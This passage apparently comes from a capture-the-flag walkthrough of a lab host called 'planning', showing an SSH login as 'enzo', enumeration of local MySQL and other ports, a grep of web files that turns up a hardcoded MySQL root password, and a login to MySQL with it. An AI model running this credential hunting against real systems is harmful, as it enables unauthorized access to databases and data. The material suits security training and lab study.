SSH
- enzo
- `Ri<SNIP>T!`

```
┌──(kali㉿kali)-[~]
└─$ ssh enzo@10.10.11.68 
enzo@10.10.11.68's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-59-generic x86_64)

<SNIP>

enzo@planning:~$ whoami
enzo
enzo@planning:~$ id
uid=1000(enzo) gid=1000(enzo) groups=1000(enzo)

enzo@planning:~$ sudo -l
[sudo] password for enzo: 
Sorry, user enzo may not run sudo on planning.
```

## mysql
There is a mysql user and service running.
```
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ MySQL version
mysql  Ver 8.0.41-0ubuntu0.24.04.1 for Linux on x86_64 ((Ubuntu))

<SNIP>

══╣ Active Ports (netstat)
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:42263         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 

```

There is also a port 8000 open locally.
## Searching for passwords
Nothing in /etc/sql.
Trying /var/www/
```
enzo@planning:/var/www$ grep -ri 'passw' .
./web/enroll.php:$password = "EXTRapHY"; 
./web/enroll.php:$conn = new mysqli($servername, $username, $password, $dbname);
./web/index.php:$password = "EXTRapHY"; 
./web/index.php:$conn = new mysqli($servername, $username, $password, $dbname);

enzo@planning:/var/www$ head /var/www/web/enroll.php 
<?php
$servername = "localhost"; 
$username = "root";
$password = "EXTRapHY"; 
$dbname = "edukate";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);

```

# mysql
root
EXTRapHY
```
enzo@planning:/var/www$ mysql -h 127.0.0.1 -P 3306 -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 21
Server version: 8.0.41-0ubuntu0.24.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```